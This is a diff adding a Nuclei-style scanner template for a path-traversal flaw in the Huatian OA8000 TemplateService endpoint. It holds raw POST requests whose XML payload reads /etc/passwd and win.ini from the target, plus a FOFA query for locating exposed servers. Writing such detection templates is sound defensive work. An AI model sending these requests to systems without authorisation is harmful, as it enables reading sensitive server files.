@@ -1,0 +1,56 @@
+id: huatian-oa-TemplateService-traversal
+info:
+  name: 华天动力 OA 系统 TemplateService - traversal
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzkzNjYwODg3Ng==&mid=2247484255&idx=1&sn=593fb55af1dc091ae6a4e94de018dbc2
+  metadata:
+    verified: true
+    fofa-query: app="华天动力-OA8000" || body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+    hunter-query: demo
+    tips:
+    repair: 官网下载最新安全补丁：http://www.oa8000.com/
+  tags: huatian,traversal,oa
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: text/xml
+        Content-Length: 99
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>/etc/passwd</string>
+        </buffalo-call>
+
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: text/xml
+        Content-Length: 99
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>c:/windows/win.ini</string>
+        </buffalo-call>
+    
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
